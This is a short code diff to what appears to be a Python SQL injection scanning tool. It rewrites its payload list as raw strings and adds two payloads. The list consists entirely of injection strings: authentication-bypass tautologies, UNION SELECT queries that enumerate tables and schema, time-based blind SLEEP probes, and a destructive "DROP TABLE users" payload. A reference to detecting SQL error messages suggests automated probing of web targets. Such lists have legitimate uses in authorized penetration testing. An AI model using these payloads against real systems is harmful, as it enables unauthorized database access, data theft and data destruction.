@@ -7,19 +7,22 @@ import threading
 
 # Enhanced list of SQL injection payloads
 sql_payloads = [
-    "' OR 1=1 --",
-    "' OR 'a'='a",
-    '" OR "a"="a"',
-    "' UNION SELECT NULL, NULL, NULL --",
-    "' UNION SELECT table_name FROM information_schema.tables --",
-    "' AND 1=1 --",
-    "' AND 1=2 --",
-    "' OR 1=1#",
-    "' OR SLEEP(5) --",
-    "' OR 1=1/*",
-    "'; DROP TABLE users --",
-    '" OR "a"="a" --',
-    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
+    r"' OR 1=1 --",
+    r"' OR 'a'='a",
+    r'" OR "a"="a"',
+    r"' UNION SELECT NULL, NULL, NULL --",
+    r"' UNION SELECT table_name FROM information_schema.tables --",
+    r"' AND 1=1 --",
+    r"' AND 1=2 --",
+    r"' OR 1=1#",
+    r"' OR SLEEP(5) --",
+    r"' OR 1=1/*",
+    r"'; DROP TABLE users --",
+    r'" OR "a"="a" --',
+    r"1' AND (SELECT COUNT(*) FROM users) > 0 --",
+    # New payloads
+    r"' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=DATABASE() --",
+    r"' OR IF(1=1, SLEEP(5), 0) --",
 ]
 
 # Common SQL error messages for detection
